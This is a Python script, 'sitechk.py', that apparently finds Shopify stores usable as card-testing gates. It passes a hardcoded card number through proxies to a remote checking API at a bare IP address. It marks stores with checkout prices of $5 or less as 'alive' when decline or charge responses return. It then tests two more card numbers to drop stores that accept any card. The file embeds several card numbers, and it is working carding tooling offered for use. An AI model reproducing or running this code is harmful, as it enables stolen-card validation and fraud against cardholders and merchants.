# sitechk.py — Shopify site checker (price limit $0-$5)
import asyncio
import re
import os
import aiohttp

API_URL = os.getenv("SITE_CHECK_API", "http://72.62.89.161:5002/shopify")
TEST_CARD = "5275190128734148|03|2030|475"
API_TIMEOUT = 90
MAX_PRICE = 5.0   # $0 - $5

DEAD_ERRORS = [
    'site error! status: 404', 'site error! status: 500', 'site error! status: 402',
    'site error! status: 502', 'site error! 503', 'site error! status: 503',
    'site not supported for now!', 'site not supported', 'connection error', 'connection error!',
    'error processing card', 'failed to get token', 'failed to get checkout',
    'failed to add to cart', 'site overloaded', 'site rate limited',
    'failed to get session token', 'unable to get payment token', 'no valid products',
    'site error! status: 403', 'payment method is not shopify!', 'not shopify!',
    'site error! status: 401', 'site requires login!',
    'site error! status: 429', 'cart failed with status 429', 'returned status 429',
    'too many requests', 'http 429', '429',
    'validation_custom', 'payments_payment_flexibility_terms_id_mismatch',
    'timeout', 'http error', 'json', 'proxy', 'curl error', 'could not resolve',
    'connect tunnel failed', 'max retries', 'GENERIC_ERROR',
    'invalid json in submit response', 'invalid json response', 'unknown result',
    'payments_credit_card_generic', 'payments_positive_amount_expected',
    'inventoryreservationfailure',
    'step 1 failed', 'step 0 failed', 'step 2 failed', 'step 3 failed', 'step 4 failed',
    'step 5 failed', 'step 6 failed', 'step 7 failed', 'step 9 failed', 'step 10 failed',
    'missing stableid', 'missing buildid', 'missing sourcetoken',
    'could not extract private_access_token', 'could not find actions js url',
    'missing proposal', 'missing submit id',
    'retryable: inventory reservation failure', 'exceeded 30 poll attempts',
    'could not extract queuetoken', 'could not extract identification signature',
    'could not extract session id', 'could not extract delivery handle',
    'could not extract signedhandles', 'could not extract shipping amount',
    'could not extract total amount', 'could not extract receiptid',
    'could not extract sessiontoken', 'errstoreincompatible', 'errmissingreceiptid',
    'fetch products', 'payments_credit_card_brand_not_supported',
    'delivery_delivery_line_detail_changed',
    'delivery_no_delivery_strategy_available_for_mercha', 'delivery_address',
]

SUCCESS_RESPONSES = [
    'CARD_DECLINED', 'INVALID_CVC', 'INCORRECT_CVV', 'INSUFFICIENT_FUNDS',
    'GENERIC_DECLINE', 'DO NOT HONOR', 'UNKNOWN_ERROR', 'Processing Error',
    'EXPIRED_CARD', 'PICK_UP_CARD', 'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED',
    '3DS_REQUIRED', 'AMOUNT_TOO_SMALL', 'INVALID_PURCHASE_TYPE',
    'INVALID_PAYMENT_METHOD', 'ORDER_PAID', 'INCORRECT_NUMBER', 'OTP_REQUIRED',
    'ORDER_PLACED', 'insufficient_funds', 'invalid_cvc',
]

FAKE_CARDS = ["4003035140199121|11|29|470", "4400666318254873|03|27|336"]

_SESSION = None


async def _get_session():
    global _SESSION
    if _SESSION is None or _SESSION.closed:
        _SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=API_TIMEOUT + 30),
            connector=aiohttp.TCPConnector(limit=500, ssl=False)
        )
    return _SESSION


def _normalize_proxy(p: str) -> str:
    if not p:
        return ""
    p = p.strip()
    for scheme in ("http://", "https://", "socks5://"):
        if p.startswith(scheme):
            return p[len(scheme):]
    return p


async def call_api(site_url: str, cc_formatted: str, proxy: str) -> dict:
    try:
        params = {
            "site": site_url,
            "cc": cc_formatted,
            "proxy": _normalize_proxy(proxy),
        }
        s = await _get_session()
        async with s.get(API_URL, params=params,
                         timeout=aiohttp.ClientTimeout(total=API_TIMEOUT),
                         ssl=False) as r:
            if r.status != 200:
                return {"success": False, "response": f"HTTP Error {r.status}",
                        "price": "-1.0", "proxy_status": "Dead", "gateway": "",
                        "error": f"HTTP_{r.status}"}
            try:
                data = await r.json(content_type=None)
            except Exception:
                return {"success": False, "response": "Invalid JSON Response",
                        "price": "-1.0", "proxy_status": "Dead", "gateway": "",
                        "error": "JSON_PARSE_ERROR"}
        return {
            "success": True,
            "response": data.get("Response", "Unknown"),
            "price": data.get("Price", "-1.0"),
            "proxy_status": "Live" if "live" in str(data.get("Proxy", "Live")).lower() else "Dead",
            "gateway": data.get("Gateway", ""),
            "error": None,
        }
    except asyncio.TimeoutError:
        return {"success": False, "response": "Timeout Error", "price": "-1.0",
                "proxy_status": "Dead", "gateway": "", "error": "TIMEOUT"}
    except aiohttp.ClientConnectorError as e:
        err = str(e).lower()
        return {"success": False,
                "response": (f"Proxy Error: {str(e)[:60]}" if "proxy" in err or "tunnel" in err
                             else f"Connection Error: {str(e)[:60]}"),
                "price": "-1.0", "proxy_status": "Dead", "gateway": "",
                "error": "PROXY_ERROR" if "proxy" in err or "tunnel" in err else "CONNECTION_ERROR"}
    except Exception as e:
        return {"success": False, "response": f"Error: {str(e)[:60]}", "price": "-1.0",
                "proxy_status": "Dead", "gateway": "", "error": "UNKNOWN_ERROR"}


async def check_site_full(site_url: str, proxy_str: str = "", max_retries: int = 3) -> dict:
    """Returns {'site':..., 'status': 'alive'|'dead', 'price':..., 'response':...}."""
    for attempt in range(max_retries):
        res = await call_api(site_url, TEST_CARD, proxy_str)
        resp = res.get("response", "Unknown")
        price_str = res.get("price", "-1.0")

        if res.get("proxy_status", "Live").lower() != "live":
            if res.get("error") in ("PROXY_ERROR", "TIMEOUT", "CONNECTION_ERROR") and attempt < max_retries - 1:
                await asyncio.sleep(0.5)
                continue

        low = resp.lower()
        if any(e.lower() in low for e in DEAD_ERRORS):
            return {"site": site_url, "status": "dead", "price": "-", "response": resp[:120]}

        if not res.get("success"):
            if res.get("error") in ("JSON_PARSE_ERROR", "HTTP_500", "HTTP_502", "HTTP_503", "HTTP_404"):
                return {"site": site_url, "status": "dead", "price": "-", "response": resp[:120]}

        if any(x in resp.upper() for x in SUCCESS_RESPONSES):
            actual_price = -1.0
            if price_str and price_str != "-1.0":
                clean = re.sub(r'[^\d.]', '', str(price_str))
                if clean:
                    try:
                        actual_price = float(clean)
                    except ValueError:
                        actual_price = -1.0

            if not (0.00 <= actual_price <= MAX_PRICE):
                return {"site": site_url, "status": "dead",
                        "price": f"${actual_price:.2f}",
                        "response": f"Price ${actual_price:.2f} (> ${MAX_PRICE:.2f} Rejected) | {resp[:80]}"}

            fake_charged = 0
            for fake_cc in FAKE_CARDS:
                try:
                    f = await call_api(site_url, fake_cc, proxy_str)
                    fr = f.get("response", "").lower()
                    if any(k in fr for k in ["thank you", "order_placed", "charged", "order_paid"]):
                        fake_charged += 1
                        break
                except Exception:
                    pass
            if fake_charged >= 1:
                return {"site": site_url, "status": "dead",
                        "price": f"${actual_price:.2f}",
                        "response": f"Fake Charge Detected | {resp[:80]}"}

            return {"site": site_url, "status": "alive",
                    "price": f"${actual_price:.2f}", "response": resp}

        return {"site": site_url, "status": "dead", "price": "-", "response": resp[:120]}

    return {"site": site_url, "status": "dead", "price": "-", "response": "Max retries"}